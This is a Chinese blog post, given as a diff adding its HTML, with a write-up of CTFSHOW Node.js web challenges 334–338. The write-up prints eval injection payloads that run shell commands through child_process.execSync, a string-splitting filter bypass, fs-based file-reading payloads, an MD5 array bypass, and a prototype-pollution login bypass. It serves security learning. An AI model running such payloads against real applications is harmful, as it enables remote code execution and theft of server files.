@@ -1,0 +1,218 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>【CTFSHOW】 web入门nodejs | 西风の小屋</title><meta name="author" content="ZEPHeyrr"><meta name="copyright" content="ZEPHeyrr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：题目：web334：​    下载附件解压能看到后台登录逻辑和账号密码，要求username的输入不能是大写的CTFSHOW，输入小写即可（touppercase函数会将输入转为大写）  web335：在浏览器f12发现提示：  eval变量可能存在rce  payload： 1?eval&#x3D;require(&quot;child_process&quot;).execSync(&amp;#x27;c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CTFSHOW】 web入门nodejs">
+<meta property="og:url" content="http://example.com/2021/12/31/ctfshow-nodejs/index.html">
+<meta property="og:site_name" content="西风の小屋">
+<meta property="og:description" content="前言：题目：web334：​    下载附件解压能看到后台登录逻辑和账号密码，要求username的输入不能是大写的CTFSHOW，输入小写即可（touppercase函数会将输入转为大写）  web335：在浏览器f12发现提示：  eval变量可能存在rce  payload： 1?eval&#x3D;require(&quot;child_process&quot;).execSync(&amp;#x27;c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/222.jpg">
+<meta property="article:published_time" content="2021-12-31T08:14:10.000Z">
+<meta property="article:modified_time" content="2022-01-10T12:22:49.019Z">
+<meta property="article:author" content="ZEPHeyrr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/222.jpg"><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="http://example.com/2021/12/31/ctfshow-nodejs/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【CTFSHOW】 web入门nodejs',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-10 12:22:49'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/macblack.css"><link rel="stylesheet" href="/css/mouse.css"><link rel="stylesheet" href="/css/trans.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heart"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo"><i class="fa-fw fa fa-comment"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Message"><i class="fa-fw fas fa-comment"></i><span> 留言</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/bckg.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">西风の小屋</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heart"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo"><i class="fa-fw fa fa-comment"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Message"><i class="fa-fw fas fa-comment"></i><span> 留言</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【CTFSHOW】 web入门nodejs</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-31T08:14:10.000Z" title="发表于 2021-12-31 08:14:10">2021-12-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-10T12:22:49.019Z" title="更新于 2022-01-10 12:22:49">2022-01-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【CTFSHOW】 web入门nodejs"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1><h2 id="web334："><a href="#web334：" class="headerlink" title="web334："></a>web334：</h2><p>​    下载附件解压能看到后台登录逻辑和账号密码，要求username的输入不能是大写的CTFSHOW，输入小写即可（touppercase函数会将输入转为大写）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/123.PNG"></p>
+<h2 id="web335："><a href="#web335：" class="headerlink" title="web335："></a>web335：</h2><p>在浏览器f12发现提示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/wda.PNG"></p>
+<p>eval变量可能存在rce</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/qe.PNG"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&quot;child_process&quot;).execSync(&#x27;cat fl00g.txt&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="web336："><a href="#web336：" class="headerlink" title="web336："></a>web336：</h2><p>上题payload已经无法使用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/nodejs-3.PNG"></p>
+<p>可以改用fs模块读取文件。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&quot;fs&quot;).readdirSync(&quot;.&quot;)  读取当前目录下文件列表</span><br><span class="line">?eval=require(&quot;fs&quot;).readFileSync(&quot;filename&quot;) 读取文件filename </span><br></pre></td></tr></table></figure>
+
+<p>另解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&quot;child_process&quot;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="web337："><a href="#web337：" class="headerlink" title="web337："></a>web337：</h2><p>hint提示传入的ab两个参数需要满足以下条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)</span><br></pre></td></tr></table></figure>
+
+<p>数组绕过，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[x]=1&amp;b[x]=2</span><br></pre></td></tr></table></figure>
+
+<h2 id="web338："><a href="#web338：" class="headerlink" title="web338："></a>web338：</h2><p>首先简单介绍一下js原型链污染：</p>
+<p>举个例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Foo是一个构造函数（类），它拥有一个值为1的属性bar</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//现在使用原型（prototype）来创建一个show()方法来输出bar属性</span></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="built_in">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()     <span class="comment">//得到输出：1</span></span><br><span class="line"><span class="comment">//使用Foo类实例化的foo对象，可以通过foo.__proto__属性访问Foo类的原型</span></span><br><span class="line"><span class="comment">//也就是说，foo..__proto__指向了Foo.prototype</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>以上，如果我们修改了<code>foo.__proto__</code>的内容，就有可能修改Foo类的内容（参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41107295/article/details/95789944%EF%BC%89">https://blog.csdn.net/qq_41107295/article/details/95789944）</a></p>
+<p>回到题目</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/nodejs338.PNG"></p>
+<p>源码中使用copy方法将请求赋给user，而secret对象继承了Object.prototype，所以可以通过修改登录的post请求修改prototype，以使得判断条件成立。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/nodejs338_1.PNG"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ZEPHeyrr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/12/31/ctfshow-nodejs/">http://example.com/2021/12/31/ctfshow-nodejs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">西风の小屋</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/222.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/10/fileinc/"><img class="prev-cover" src="/222.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【CTFSHOW】 web入门文件包含</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/28/xss-strange/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/xsscover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">那些看不懂的操作【alert无数字字母有效载荷】</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ZEPHeyrr</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZEPHeyrr"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我就是又菜又爱玩怎么啦 =^=  <img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/�����������籬ը�ƶԻ���ԭ���Ի�����4gif.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">题目：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web334%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">web334：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web335%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">web335：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web336%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">web336：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web337%EF%BC%9A"><span class="toc-number">2.4.</span> <span class="toc-text">web337：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web338%EF%BC%9A"><span class="toc-number">2.5.</span> <span class="toc-text">web338：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/01/25/ctfshow-ssrf/" title="【CTFSHOW】 web入门SSRF"><img src="/222.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CTFSHOW】 web入门SSRF"/></a><div class="content"><a class="title" href="/2022/01/25/ctfshow-ssrf/" title="【CTFSHOW】 web入门SSRF">【CTFSHOW】 web入门SSRF</a><time datetime="2022-01-25T06:55:44.000Z" title="发表于 2022-01-25 06:55:44">2022-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/14/ctfshow-sqli/" title="【CTFSHOW】 web入门sql注入"><img src="/222.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CTFSHOW】 web入门sql注入"/></a><div class="content"><a class="title" href="/2022/01/14/ctfshow-sqli/" title="【CTFSHOW】 web入门sql注入">【CTFSHOW】 web入门sql注入</a><time datetime="2022-01-14T10:47:34.000Z" title="发表于 2022-01-14 10:47:34">2022-01-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/10/fileinc/" title="【CTFSHOW】 web入门文件包含"><img src="/222.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CTFSHOW】 web入门文件包含"/></a><div class="content"><a class="title" href="/2022/01/10/fileinc/" title="【CTFSHOW】 web入门文件包含">【CTFSHOW】 web入门文件包含</a><time datetime="2022-01-10T07:29:38.000Z" title="发表于 2022-01-10 07:29:38">2022-01-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/31/ctfshow-nodejs/" title="【CTFSHOW】 web入门nodejs"><img src="/222.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CTFSHOW】 web入门nodejs"/></a><div class="content"><a class="title" href="/2021/12/31/ctfshow-nodejs/" title="【CTFSHOW】 web入门nodejs">【CTFSHOW】 web入门nodejs</a><time datetime="2021-12-31T08:14:10.000Z" title="发表于 2021-12-31 08:14:10">2021-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/28/xss-strange/" title="那些看不懂的操作【alert无数字字母有效载荷】"><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/xsscover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="那些看不懂的操作【alert无数字字母有效载荷】"/></a><div class="content"><a class="title" href="/2021/09/28/xss-strange/" title="那些看不懂的操作【alert无数字字母有效载荷】">那些看不懂的操作【alert无数字字母有效载荷】</a><time datetime="2021-09-28T15:58:30.000Z" title="发表于 2021-09-28 15:58:30">2021-09-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022  <i id="heartbeat" class="fa fas fa-heartbeat"></i> ZEPHeyrr</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'emcbjtpAX6FKY93aCdO8qk2c-MdYXbMMI',
+      appKey: 'XJI9fJqbm71pDTHE92oWaWPA',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/combine/npm/jquery@latest/dist/jquery.min.js,gh/weilining/jsdelivr/jquery/circlemagic/circlemagic.min.js,gh/weilining/jsdelivr@latest/jquery/circlemagic/butterflycirclemagic.js"></script><script src="/js/feet.js"></script><script src="/js/snow.js"></script><script src="https://cdn.jsdelivr.net/gh/xiabo2/CDN@latest/fishes.js"></script><script src="https://cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
